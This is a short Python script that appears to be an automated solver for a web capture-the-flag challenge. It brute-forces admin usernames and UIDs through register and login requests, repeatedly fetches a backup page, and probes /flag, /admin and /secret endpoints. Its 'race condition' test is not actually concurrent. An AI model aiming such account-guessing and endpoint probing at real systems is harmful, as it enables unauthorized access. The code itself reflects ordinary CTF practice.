#!/usr/bin/env python3
import requests
import threading
import time
import sys

url = "http://8080-26908653-7324-41e9-98cb-8f7c72ff8626.challenge.ctfplus.cn/"

print("[*] Focused CTF Solver")
print(f"  Target: {url}")

# Test 1: Brute force admin usernames with various UIDs
print("\n[Test 1] Testing admin username combinations...")
admin_usernames = ['admin', 'root', 'administrator', 'superadmin']
uids = ['admin', 'root', '0', '1', '049ce3ec901b46a5b3e94f68f4c77f99']

for username in admin_usernames:
    for uid in uids:
        print(f"  Testing {username}/{uid}")
        try:
            r = requests.post(url + '/register', 
                              data={'uid': uid, 'username': username, 'password': 'test123'}, 
                              timeout=5)
            if r.status_code == 200:
                print(f"  Reg OK")
            # Try login
            r2 = requests.post(url + '/login', data={'uid': uid, 'password': 'test123'}, timeout=5)
            if r2.status_code != 405 and 'flag' in r2.text.lower():
                print(f"  *** FLAG FOUND: {r2.text} ***")
                sys.exit(0)
        except:
            pass

# Test 2: Race condition on backup
print("\n[Test 2] Testing race condition on backup...")
def race_backup(uid):
    results = []
    for i in range(10):
        try:
            r = requests.get(url + '?uid=' + uid, timeout=3)
            if r.status_code == 200:
                results.append(r.text)
                if 'flag' in r.text.lower():
                    print(f"  *** FLAG FOUND: {r.text} ***")
                    sys.exit(0)
        except:
            pass
    return results

for uid in uids:
    print(f"  Racing on UID: {uid}")
    results = race_backup(uid)
    if results:
        print(f"  Got {len(results)} responses")
        for resp in results[:5]:
            if len(resp) < 1000:
                print(f"  Content: {resp}")

# Test 3: Direct endpoint access
print("\n[Test 3] Testing direct endpoints...")
endpoints = ['/flag', '/admin', '/secret']
for endpoint in endpoints:
    for uid in uids:
        r = requests.get(url + endpoint + '?uid=' + uid, timeout=5)
        if r.status_code == 200:
            if 'flag' in r.text.lower():
                print(f"  *** FLAG FOUND: {r.text} ***")
                sys.exit(0)

print("\n[*] Testing complete!")
